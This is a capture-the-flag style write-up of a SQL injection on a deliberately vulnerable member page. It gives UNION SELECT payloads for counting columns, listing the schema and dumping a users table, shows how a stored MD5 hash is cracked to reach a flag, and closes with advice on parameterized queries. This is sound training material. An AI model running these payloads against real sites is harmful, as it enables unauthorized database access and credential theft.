## Exploit
On the member page `${URL}?page=member`, we get SQL errors if we type random data, hinting at an SQL injection vulnerability, which happens when the user can directly control the SQL query sent to the database.

First let's get the number of rows. The UNION statement allows us to execute additional queries and to append them to the original one.
```SQL
1=1 UNION SELECT NULL           # 'The used SELECT statements have a different number of columns'
1=1 UNION SELECT NULL,NULL      # works
1=1 UNION SELECT NULL,NULL,NULL # 'The used SELECT statements have a different number of columns'
```
We can conclude that we have access to two columns of output, let's try getting the table and column names from the [mySQL schema](https://dev.mysql.com/doc/mysql-infoschema-excerpt/5.6/en/information-schema-columns-table.html)

```SQL
1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
We can see that the `users` table contains several informations about them, such as `user_id` `first_name` `last_name` `town` `country` `planet` `Commentaire` and `countersign`

MySQL uses the `CONCAT` function to concacenate multiple strings
```SQL
1=1 UNION SELECT NULL, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```

We get `Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28` as the last result, the decrypted md5 reads `FortyTwo`, let's convert it to sha256
```shell
$ echo -n fortytwo | sha256sum
[REDACTED] -
```

## Fix
To defend against SQL injections developers should use prepared statements with parameterized queries, this will prevent any chance of injections occuring.
A less effective method that should be avoided is to escape the user supplied input, this method is heavily dependent on the database implementation and error-prone, it can make for a secondary defense however.
